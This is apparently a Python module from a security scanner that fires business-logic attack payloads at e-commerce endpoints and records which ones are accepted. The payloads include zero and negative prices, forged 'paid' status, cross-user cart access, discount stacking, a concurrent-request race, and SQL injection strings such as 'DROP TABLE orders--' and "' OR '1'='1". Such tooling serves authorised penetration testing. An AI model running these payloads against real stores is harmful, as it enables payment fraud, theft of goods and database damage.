"""E-Commerce Business Logic Testing — deep testing of cart, checkout, and payment flows.

This module tests:
1. Price tampering (negative, zero, overflow, decimal precision)
2. Quantity manipulation (negative, zero, overflow, decimal)
3. Discount abuse (stacking, expired, referral loops)
4. Cart manipulation (cross-user, total modification)
5. Order manipulation (status change, address change, cancellation)
6. Payment bypass (skip payment, modify amount, test cards)
7. Coupon abuse (reuse, enumeration, injection)
8. Shipping manipulation (free shipping, address validation)
"""

from __future__ import annotations

import asyncio
import json
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from titan.core.models import Finding, Severity, AttackType


@dataclass
class BusinessLogicPayload:
    """A business logic test payload."""
    name: str
    category: str
    payload: Any  # Can be dict, list, or string
    expected_effect: str
    severity: Severity
    confidence: float


class ECommerceTester:
    """Deep e-commerce business logic testing."""

    # ── Price Tampering Payloads ────────────────────────────────────────

    PRICE_TAMPERING_PAYLOADS = [
        # Negative prices
        BusinessLogicPayload(
            name="negative_price",
            category="price_tampering",
            payload={"price": -1, "amount": -1, "total": -1, "cost": -1},
            expected_effect="negative_total",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        BusinessLogicPayload(
            name="negative_price_float",
            category="price_tampering",
            payload={"price": -0.01, "amount": -0.01, "total": -0.01},
            expected_effect="negative_total",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        # Zero prices
        BusinessLogicPayload(
            name="zero_price",
            category="price_tampering",
            payload={"price": 0, "amount": 0, "total": 0, "cost": 0},
            expected_effect="free_item",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        # Integer overflow
        BusinessLogicPayload(
            name="integer_overflow",
            category="price_tampering",
            payload={"price": 2147483648, "amount": 2147483648},
            expected_effect="overflow",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        BusinessLogicPayload(
            name="integer_overflow_negative",
            category="price_tampering",
            payload={"price": -2147483648, "amount": -2147483648},
            expected_effect="overflow",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        # Decimal precision attacks
        BusinessLogicPayload(
            name="decimal_precision",
            category="price_tampering",
            payload={"price": 0.001, "amount": 0.001, "total": 0.001},
            expected_effect="rounding_error",
            severity=Severity.MEDIUM,
            confidence=0.60,
        ),
        BusinessLogicPayload(
            name="decimal_overflow",
            category="price_tampering",
            payload={"price": 99999999.99, "amount": 99999999.99},
            expected_effect="overflow",
            severity=Severity.MEDIUM,
            confidence=0.65,
        ),
        # String injection in price fields
        BusinessLogicPayload(
            name="price_string_injection",
            category="price_tampering",
            payload={"price": "100; DROP TABLE orders--", "amount": "100' OR '1'='1"},
            expected_effect="injection",
            severity=Severity.CRITICAL,
            confidence=0.75,
        ),
        # Currency manipulation
        BusinessLogicPayload(
            name="currency_mismatch",
            category="price_tampering",
            payload={"price": 100, "currency": "USD", "convert_to": "KES"},
            expected_effect="currency_confusion",
            severity=Severity.MEDIUM,
            confidence=0.55,
        ),
        # Free item via parameter manipulation
        BusinessLogicPayload(
            name="free_item_via_param",
            category="price_tampering",
            payload={"discount_code": "FREE", "coupon": "FREE100", "promo": "FREE"},
            expected_effect="free_item",
            severity=Severity.HIGH,
            confidence=0.70,
        ),
    ]

    # ── Quantity Manipulation Payloads ──────────────────────────────────

    QUANTITY_MANIPULATION_PAYLOADS = [
        # Negative quantity
        BusinessLogicPayload(
            name="negative_quantity",
            category="quantity_manipulation",
            payload={"quantity": -1, "qty": -1, "count": -1},
            expected_effect="negative_total",
            severity=Severity.HIGH,
            confidence=0.85,
        ),
        # Zero quantity
        BusinessLogicPayload(
            name="zero_quantity",
            category="quantity_manipulation",
            payload={"quantity": 0, "qty": 0, "count": 0},
            expected_effect="zero_total",
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        # Overflow quantity
        BusinessLogicPayload(
            name="overflow_quantity",
            category="quantity_manipulation",
            payload={"quantity": 999999999, "qty": 999999999},
            expected_effect="overflow",
            severity=Severity.HIGH,
            confidence=0.75,
        ),
        # Decimal quantity
        BusinessLogicPayload(
            name="decimal_quantity",
            category="quantity_manipulation",
            payload={"quantity": 0.5, "qty": 0.5, "count": 1.5},
            expected_effect="fractional_item",
            severity=Severity.MEDIUM,
            confidence=0.65,
        ),
        # String quantity
        BusinessLogicPayload(
            name="string_quantity",
            category="quantity_manipulation",
            payload={"quantity": "1; DROP TABLE orders--", "qty": "1' OR '1'='1"},
            expected_effect="injection",
            severity=Severity.CRITICAL,
            confidence=0.75,
        ),
        # Array quantity
        BusinessLogicPayload(
            name="array_quantity",
            category="quantity_manipulation",
            payload={"quantity": [1, 2, 3], "qty": [1, 2, 3]},
            expected_effect="array_confusion",
            severity=Severity.MEDIUM,
            confidence=0.60,
        ),
        # Null quantity
        BusinessLogicPayload(
            name="null_quantity",
            category="quantity_manipulation",
            payload={"quantity": None, "qty": None},
            expected_effect="null_bypass",
            severity=Severity.MEDIUM,
            confidence=0.55,
        ),
    ]

    # ── Discount Abuse Payloads ─────────────────────────────────────────

    DISCOUNT_ABUSE_PAYLOADS = [
        # Stack discounts
        BusinessLogicPayload(
            name="stack_discounts",
            category="discount_abuse",
            payload={"discount_codes": ["SAVE10", "SAVE20", "FREE SHIPPING"]},
            expected_effect="stacked_discount",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        # Expired coupon
        BusinessLogicPayload(
            name="expired_coupon",
            category="discount_abuse",
            payload={"coupon": "EXPIRED2020", "promo": "OLDDEAL"},
            expected_effect="expired_coupon_accepted",
            severity=Severity.MEDIUM,
            confidence=0.65,
        ),
        # Percentage overflow
        BusinessLogicPayload(
            name="percentage_overflow",
            category="discount_abuse",
            payload={"discount_percent": 100, "discount_percent": 200, "discount_percent": 999},
            expected_effect="free_item",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        # Negative discount (adds to total)
        BusinessLogicPayload(
            name="negative_discount",
            category="discount_abuse",
            payload={"discount": -10, "discount_amount": -50},
            expected_effect="increased_total",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        # Referral loop
        BusinessLogicPayload(
            name="referral_loop",
            category="discount_abuse",
            payload={"referral_code": "SELF", "referrer": "self", "affiliate": "self"},
            expected_effect="self_referral",
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        # Coupon enumeration
        BusinessLogicPayload(
            name="coupon_enumeration",
            category="discount_abuse",
            payload={"coupon": "TEST", "coupon": "ADMIN", "coupon": "FREE"},
            expected_effect="coupon_enumeration",
            severity=Severity.LOW,
            confidence=0.50,
        ),
    ]

    # ── Cart Manipulation Payloads ──────────────────────────────────────

    CART_MANIPULATION_PAYLOADS = [
        # Cross-user cart access
        BusinessLogicPayload(
            name="cross_user_cart",
            category="cart_manipulation",
            payload={"user_id": 1, "cart_id": "other_user_cart"},
            expected_effect="cross_user_access",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        # Cart total manipulation
        BusinessLogicPayload(
            name="cart_total_manipulation",
            category="cart_manipulation",
            payload={"total": 0, "subtotal": 0, "grand_total": 0},
            expected_effect="free_cart",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        # Add items to other users' carts
        BusinessLogicPayload(
            name="add_to_other_cart",
            category="cart_manipulation",
            payload={"target_user_id": 1, "item_id": 1, "quantity": 1},
            expected_effect="cross_user_cart modification",
            severity=Severity.HIGH,
            confidence=0.75,
        ),
        # Cart timestamp manipulation
        BusinessLogicPayload(
            name="cart_timestamp",
            category="cart_manipulation",
            payload={"created_at": "2020-01-01", "expires_at": "2099-12-31"},
            expected_effect="timestamp_bypass",
            severity=Severity.MEDIUM,
            confidence=0.60,
        ),
    ]

    # ── Payment Bypass Payloads ─────────────────────────────────────────

    PAYMENT_BYPASS_PAYLOADS = [
        # Skip payment step
        BusinessLogicPayload(
            name="skip_payment",
            category="payment_bypass",
            payload={"payment_status": "paid", "paid": True, "completed": True},
            expected_effect="payment_skip",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        # Modify payment amount
        BusinessLogicPayload(
            name="modify_payment_amount",
            category="payment_bypass",
            payload={"payment_amount": 0, "amount_paid": 0, "total_paid": 0},
            expected_effect="zero_payment",
            severity=Severity.CRITICAL,
            confidence=0.90,
        ),
        # Test card in production
        BusinessLogicPayload(
            name="test_card_production",
            category="payment_bypass",
            payload={"card_number": "4242424242424242", "exp": "12/25", "cvv": "123"},
            expected_effect="test_card_accepted",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        # Payment method switching
        BusinessLogicPayload(
            name="payment_method_switch",
            category="payment_bypass",
            payload={"payment_method": "free", "payment_type": "comp", "payment_status": "waived"},
            expected_effect="free_payment",
            severity=Severity.HIGH,
            confidence=0.75,
        ),
        # Currency mismatch
        BusinessLogicPayload(
            name="currency_mismatch_payment",
            category="payment_bypass",
            payload={"currency": "USD", "amount": 100, "payment_currency": "KES"},
            expected_effect="currency_confusion",
            severity=Severity.MEDIUM,
            confidence=0.60,
        ),
    ]

    # ── Order Manipulation Payloads ─────────────────────────────────────

    ORDER_MANIPULATION_PAYLOADS = [
        # Status change
        BusinessLogicPayload(
            name="status_change",
            category="order_manipulation",
            payload={"status": "completed", "order_status": "shipped", "delivery_status": "delivered"},
            expected_effect="status_bypass",
            severity=Severity.HIGH,
            confidence=0.80,
        ),
        # Address change after payment
        BusinessLogicPayload(
            name="address_change",
            category="order_manipulation",
            payload={"shipping_address": "attacker@evil.com", "delivery_address": "123 Evil St"},
            expected_effect="address_hijack",
            severity=Severity.CRITICAL,
            confidence=0.85,
        ),
        # Cancel completed order
        BusinessLogicPayload(
            name="cancel_completed",
            category="order_manipulation",
            payload={"action": "cancel", "status": "cancelled"},
            expected_effect="cancel_bypass",
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        # Modify order items after payment
        BusinessLogicPayload(
            name="modify_items_after_payment",
            category="order_manipulation",
            payload={"items": [{"id": 1, "quantity": 10}]},
            expected_effect="item_modification",
            severity=Severity.HIGH,
            confidence=0.75,
        ),
    ]

    def __init__(self, context: Any = None):
        self.context = context
        self._findings: List[Finding] = []

    async def test_price_tampering(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test for price tampering vulnerabilities."""
        findings = []

        for endpoint in endpoints:
            url = endpoint.get("url", target_url)
            method = endpoint.get("method", "POST")
            params = endpoint.get("params", {})

            for payload in self.PRICE_TAMPERING_PAYLOADS:
                try:
                    # Merge payload with existing params
                    test_params = {**params, **payload.payload}

                    # Send request
                    response = await self._send_request(
                        url, method, test_params, auth_headers
                    )

                    if response is None:
                        continue

                    # Check if price was accepted
                    if self._check_price_accepted(response, payload):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=method,
                            param=str(list(payload.payload.keys())[0]),
                            location="body",
                            payload=json.dumps(payload.payload),
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            confidence=payload.confidence,
                            status=response.get("status", 0),
                            evidence=response.get("body", "")[:500],
                            tier="confirmed" if payload.confidence > 0.8 else "suspicious",
                            tags=["business_logic", "ecommerce", "price_tampering", payload.name],
                            notes=f"Price tampering: {payload.name} - {payload.expected_effect}",
                        )
                        findings.append(finding)

                except Exception as e:
                    continue

        self._findings.extend(findings)
        return findings

    async def test_quantity_manipulation(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test for quantity manipulation vulnerabilities."""
        findings = []

        for endpoint in endpoints:
            url = endpoint.get("url", target_url)
            method = endpoint.get("method", "POST")
            params = endpoint.get("params", {})

            for payload in self.QUANTITY_MANIPULATION_PAYLOADS:
                try:
                    test_params = {**params, **payload.payload}

                    response = await self._send_request(
                        url, method, test_params, auth_headers
                    )

                    if response is None:
                        continue

                    if self._check_quantity_accepted(response, payload):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=method,
                            param=str(list(payload.payload.keys())[0]),
                            location="body",
                            payload=json.dumps(payload.payload),
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            confidence=payload.confidence,
                            status=response.get("status", 0),
                            evidence=response.get("body", "")[:500],
                            tier="confirmed" if payload.confidence > 0.8 else "suspicious",
                            tags=["business_logic", "ecommerce", "quantity_manipulation", payload.name],
                            notes=f"Quantity manipulation: {payload.name} - {payload.expected_effect}",
                        )
                        findings.append(finding)

                except Exception:
                    continue

        self._findings.extend(findings)
        return findings

    async def test_discount_abuse(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test for discount abuse vulnerabilities."""
        findings = []

        for endpoint in endpoints:
            url = endpoint.get("url", target_url)
            method = endpoint.get("method", "POST")
            params = endpoint.get("params", {})

            for payload in self.DISCOUNT_ABUSE_PAYLOADS:
                try:
                    test_params = {**params, **payload.payload}

                    response = await self._send_request(
                        url, method, test_params, auth_headers
                    )

                    if response is None:
                        continue

                    if self._check_discount_accepted(response, payload):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=method,
                            param=str(list(payload.payload.keys())[0]),
                            location="body",
                            payload=json.dumps(payload.payload),
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            confidence=payload.confidence,
                            status=response.get("status", 0),
                            evidence=response.get("body", "")[:500],
                            tier="confirmed" if payload.confidence > 0.8 else "suspicious",
                            tags=["business_logic", "ecommerce", "discount_abuse", payload.name],
                            notes=f"Discount abuse: {payload.name} - {payload.expected_effect}",
                        )
                        findings.append(finding)

                except Exception:
                    continue

        self._findings.extend(findings)
        return findings

    async def test_cart_manipulation(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test for cart manipulation vulnerabilities."""
        findings = []

        for endpoint in endpoints:
            url = endpoint.get("url", target_url)
            method = endpoint.get("method", "POST")
            params = endpoint.get("params", {})

            for payload in self.CART_MANIPULATION_PAYLOADS:
                try:
                    test_params = {**params, **payload.payload}

                    response = await self._send_request(
                        url, method, test_params, auth_headers
                    )

                    if response is None:
                        continue

                    if self._check_cart_manipulation(response, payload):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=method,
                            param=str(list(payload.payload.keys())[0]),
                            location="body",
                            payload=json.dumps(payload.payload),
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            confidence=payload.confidence,
                            status=response.get("status", 0),
                            evidence=response.get("body", "")[:500],
                            tier="confirmed" if payload.confidence > 0.8 else "suspicious",
                            tags=["business_logic", "ecommerce", "cart_manipulation", payload.name],
                            notes=f"Cart manipulation: {payload.name} - {payload.expected_effect}",
                        )
                        findings.append(finding)

                except Exception:
                    continue

        self._findings.extend(findings)
        return findings

    async def test_payment_bypass(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test for payment bypass vulnerabilities."""
        findings = []

        for endpoint in endpoints:
            url = endpoint.get("url", target_url)
            method = endpoint.get("method", "POST")
            params = endpoint.get("params", {})

            for payload in self.PAYMENT_BYPASS_PAYLOADS:
                try:
                    test_params = {**params, **payload.payload}

                    response = await self._send_request(
                        url, method, test_params, auth_headers
                    )

                    if response is None:
                        continue

                    if self._check_payment_bypass(response, payload):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=method,
                            param=str(list(payload.payload.keys())[0]),
                            location="body",
                            payload=json.dumps(payload.payload),
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            confidence=payload.confidence,
                            status=response.get("status", 0),
                            evidence=response.get("body", "")[:500],
                            tier="confirmed" if payload.confidence > 0.8 else "suspicious",
                            tags=["business_logic", "ecommerce", "payment_bypass", payload.name],
                            notes=f"Payment bypass: {payload.name} - {payload.expected_effect}",
                        )
                        findings.append(finding)

                except Exception:
                    continue

        self._findings.extend(findings)
        return findings

    async def test_order_manipulation(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test for order manipulation vulnerabilities."""
        findings = []

        for endpoint in endpoints:
            url = endpoint.get("url", target_url)
            method = endpoint.get("method", "POST")
            params = endpoint.get("params", {})

            for payload in self.ORDER_MANIPULATION_PAYLOADS:
                try:
                    test_params = {**params, **payload.payload}

                    response = await self._send_request(
                        url, method, test_params, auth_headers
                    )

                    if response is None:
                        continue

                    if self._check_order_manipulation(response, payload):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=method,
                            param=str(list(payload.payload.keys())[0]),
                            location="body",
                            payload=json.dumps(payload.payload),
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            confidence=payload.confidence,
                            status=response.get("status", 0),
                            evidence=response.get("body", "")[:500],
                            tier="confirmed" if payload.confidence > 0.8 else "suspicious",
                            tags=["business_logic", "ecommerce", "order_manipulation", payload.name],
                            notes=f"Order manipulation: {payload.name} - {payload.expected_effect}",
                        )
                        findings.append(finding)

                except Exception:
                    continue

        self._findings.extend(findings)
        return findings

    # ── Helper Methods ──────────────────────────────────────────────────

    async def _send_request(
        self,
        url: str,
        method: str,
        params: Dict[str, Any],
        headers: Optional[Dict[str, str]] = None,
    ) -> Optional[Dict[str, Any]]:
        """Send HTTP request and return response."""
        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                if method.upper() == "GET":
                    async with session.get(url, params=params, headers=headers or {}) as resp:
                        return {
                            "status": resp.status,
                            "body": await resp.text(),
                            "headers": dict(resp.headers),
                        }
                elif method.upper() == "POST":
                    async with session.post(url, json=params, headers=headers or {}) as resp:
                        return {
                            "status": resp.status,
                            "body": await resp.text(),
                            "headers": dict(resp.headers),
                        }
                elif method.upper() == "PUT":
                    async with session.put(url, json=params, headers=headers or {}) as resp:
                        return {
                            "status": resp.status,
                            "body": await resp.text(),
                            "headers": dict(resp.headers),
                        }
                elif method.upper() == "PATCH":
                    async with session.patch(url, json=params, headers=headers or {}) as resp:
                        return {
                            "status": resp.status,
                            "body": await resp.text(),
                            "headers": dict(resp.headers),
                        }
        except Exception:
            return None

    def _check_price_accepted(self, response: Dict[str, Any], payload: BusinessLogicPayload) -> bool:
        """Check if price tampering was accepted."""
        status = response.get("status", 0)
        body = response.get("body", "")

        # Success indicators
        if status in (200, 201, 202):
            # Check for price in response
            if payload.expected_effect == "negative_total":
                # Negative total accepted
                if re.search(r'"total":\s*-\d+', body) or re.search(r'"price":\s*-\d+', body):
                    return True
            elif payload.expected_effect == "free_item":
                # Zero total accepted
                if re.search(r'"total":\s*0', body) or re.search(r'"price":\s*0', body):
                    return True
            elif payload.expected_effect == "injection":
                # SQL error in response
                if any(kw in body.lower() for kw in ["sql", "syntax", "error", "mysql", "postgresql"]):
                    return True

        return False

    def _check_quantity_accepted(self, response: Dict[str, Any], payload: BusinessLogicPayload) -> bool:
        """Check if quantity manipulation was accepted."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status in (200, 201, 202):
            if payload.expected_effect == "negative_total":
                if re.search(r'"total":\s*-\d+', body):
                    return True
            elif payload.expected_effect == "fractional_item":
                if re.search(r'"quantity":\s*0\.\d+', body):
                    return True
            elif payload.expected_effect == "injection":
                if any(kw in body.lower() for kw in ["sql", "syntax", "error"]):
                    return True

        return False

    def _check_discount_accepted(self, response: Dict[str, Any], payload: BusinessLogicPayload) -> bool:
        """Check if discount abuse was accepted."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status in (200, 201, 202):
            if payload.expected_effect == "stacked_discount":
                # Multiple discounts applied
                if body.count("discount") > 1 or body.count("coupon") > 1:
                    return True
            elif payload.expected_effect == "free_item":
                if re.search(r'"discount":\s*\d{3,}', body) or re.search(r'"total":\s*0', body):
                    return True
            elif payload.expected_effect == "increased_total":
                if re.search(r'"total":\s*-\d+', body):
                    return True

        return False

    def _check_cart_manipulation(self, response: Dict[str, Any], payload: BusinessLogicPayload) -> bool:
        """Check if cart manipulation was accepted."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status in (200, 201, 202):
            if payload.expected_effect == "free_cart":
                if re.search(r'"total":\s*0', body):
                    return True
            elif payload.expected_effect == "cross_user_access":
                # Access to other user's cart data
                if "user_id" in body and "cart" in body:
                    return True

        return False

    def _check_payment_bypass(self, response: Dict[str, Any], payload: BusinessLogicPayload) -> bool:
        """Check if payment bypass was accepted."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status in (200, 201, 202):
            if payload.expected_effect == "payment_skip":
                if re.search(r'"status":\s*"completed"', body) or re.search(r'"paid":\s*true', body):
                    return True
            elif payload.expected_effect == "zero_payment":
                if re.search(r'"amount_paid":\s*0', body) or re.search(r'"total_paid":\s*0', body):
                    return True

        return False

    def _check_order_manipulation(self, response: Dict[str, Any], payload: BusinessLogicPayload) -> bool:
        """Check if order manipulation was accepted."""
        status = response.get("status", 0)
        body = response.get("body", "")

        if status in (200, 201, 202):
            if payload.expected_effect == "status_bypass":
                if re.search(r'"status":\s*"completed"', body) or re.search(r'"status":\s*"shipped"', body):
                    return True
            elif payload.expected_effect == "address_hijack":
                if "evil" in body.lower() or "attacker" in body.lower():
                    return True

        return False

    # ── Multi-Step Flow Testing ────────────────────────────────────────

    async def test_multi_step_flow(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """
        Test multi-step e-commerce flow:
        1. Add item to cart
        2. Modify price/quantity/discount
        3. Proceed to checkout
        4. Verify if tampered values persisted

        This catches vulnerabilities where server recalculates prices
        (secure) vs accepts client-supplied prices (vulnerable).
        """
        findings = []

        # Find cart, checkout, and order endpoints
        cart_endpoints = [e for e in endpoints if any(
            k in e.get("url", "").lower() for k in ["cart", "basket", "add"]
        )]
        checkout_endpoints = [e for e in endpoints if any(
            k in e.get("url", "").lower() for k in ["checkout", "order", "pay"]
        )]

        if not cart_endpoints or not checkout_endpoints:
            # Fallback: use first two endpoints as cart/checkout
            if len(endpoints) >= 2:
                cart_endpoints = [endpoints[0]]
                checkout_endpoints = [endpoints[1]]
            else:
                return findings

        # Step 1: Add item normally (baseline)
        cart_url = cart_endpoints[0].get("url", target_url)
        cart_params = cart_endpoints[0].get("params", {})
        cart_method = cart_endpoints[0].get("method", "POST")

        try:
            baseline_resp = await self._send_request(
                cart_url, cart_method, cart_params, auth_headers
            )
            if baseline_resp is None or baseline_resp.get("status", 0) not in (200, 201, 202):
                return findings
        except Exception:
            return findings

        # Step 2: Add item with tampered parameters
        tamper_variants = [
            {"price": 0, "_attack": "free_item_flow"},
            {"price": -100, "_attack": "negative_price_flow"},
            {"quantity": -1, "_attack": "negative_qty_flow"},
            {"discount_percent": 100, "_attack": "full_discount_flow"},
        ]

        for tamper in tamper_variants:
            attack_name = tamper.pop("_attack")
            try:
                tampered_params = {**cart_params, **tamper}
                tamper_resp = await self._send_request(
                    cart_url, cart_method, tampered_params, auth_headers
                )
                if tamper_resp is None or tamper_resp.get("status", 0) not in (200, 201, 202):
                    continue

                # Step 3: Proceed to checkout with tampered cart
                checkout_url = checkout_endpoints[0].get("url", target_url)
                checkout_params = checkout_endpoints[0].get("params", {})
                checkout_method = checkout_endpoints[0].get("method", "POST")

                # Merge tampered values into checkout
                checkout_with_tamper = {**checkout_params, **tamper}
                checkout_resp = await self._send_request(
                    checkout_url, checkout_method, checkout_with_tamper, auth_headers
                )

                if checkout_resp is None:
                    continue

                checkout_body = checkout_resp.get("body", "")
                checkout_status = checkout_resp.get("status", 0)

                # Step 4: Verify if tampered values persisted to checkout
                if checkout_status in (200, 201, 202):
                    # Check if tampered price appears in checkout response
                    tampered_value_str = str(list(tamper.values())[0])
                    if tampered_value_str in checkout_body or \
                       re.search(r'"total":\s*0', checkout_body) and "price" in tamper or \
                       re.search(r'"total":\s*-\d+', checkout_body):

                        finding = Finding(
                            target=target_url,
                            url=checkout_url,
                            method=checkout_method,
                            param="price",
                            location="body",
                            payload=json.dumps(tamper),
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=Severity.CRITICAL,
                            confidence=0.92,
                            status=checkout_status,
                            evidence=checkout_body[:500],
                            tier="confirmed",
                            tags=["business_logic", "ecommerce", "multi_step_flow", attack_name],
                            notes=(
                                f"Multi-step price tampering: {attack_name}. "
                                f"Tampered value persisted from cart ({cart_url}) "
                                f"to checkout ({checkout_url}). "
                                f"Server accepted client-supplied price."
                            ),
                        )
                        findings.append(finding)

            except Exception:
                continue

        self._findings.extend(findings)
        return findings

    # ── Cart-State Persistence Test ────────────────────────────────────

    async def test_cart_state_persistence(
        self,
        target_url: str,
        endpoints: List[Dict[str, Any]],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[Finding]:
        """Test if cart state persists across requests (race condition)."""
        findings = []

        cart_endpoints = [e for e in endpoints if any(
            k in e.get("url", "").lower() for k in ["cart", "basket", "add", "item"]
        )]

        if not cart_endpoints:
            return findings

        url = cart_endpoints[0].get("url", target_url)
        params = cart_endpoints[0].get("params", {})
        method = cart_endpoints[0].get("method", "POST")

        # Send rapid concurrent requests to add same item
        import asyncio
        try:
            tasks = [
                self._send_request(url, method, {
                    **params,
                    "price": 0,
                    "quantity": 1,
                }, auth_headers)
                for _ in range(10)
            ]
            responses = await asyncio.gather(*tasks, return_exceptions=True)

            success_count = sum(
                1 for r in responses
                if not isinstance(r, Exception) and r and r.get("status", 0) in (200, 201, 202)
            )

            if success_count > 1:
                # Check if multiple zero-price items were added
                zero_price_count = 0
                for r in responses:
                    if not isinstance(r, Exception) and r:
                        body = r.get("body", "")
                        if re.search(r'"price":\s*0', body) or re.search(r'"total":\s*0', body):
                            zero_price_count += 1

                if zero_price_count > 0:
                    finding = Finding(
                        target=target_url,
                        url=url,
                        method=method,
                        param="concurrent_cart",
                        location="body",
                        payload=f"10 concurrent add-to-cart requests with price=0",
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=Severity.HIGH,
                        confidence=0.82,
                        status=200,
                        evidence=f"{zero_price_count} zero-price items added via race condition",
                        tier="suspicious",
                        tags=["business_logic", "ecommerce", "race_condition", "cart_persistence"],
                        notes=(
                            f"Cart state persistence: {success_count} concurrent requests succeeded, "
                            f"{zero_price_count} resulted in zero-price items. "
                            f"Server may be vulnerable to race condition on price calculation."
                        ),
                    )
                    findings.append(finding)

        except Exception:
            pass

        self._findings.extend(findings)
        return findings

    def get_findings(self) -> List[Finding]:
        """Get all findings from this tester."""
        return self._findings
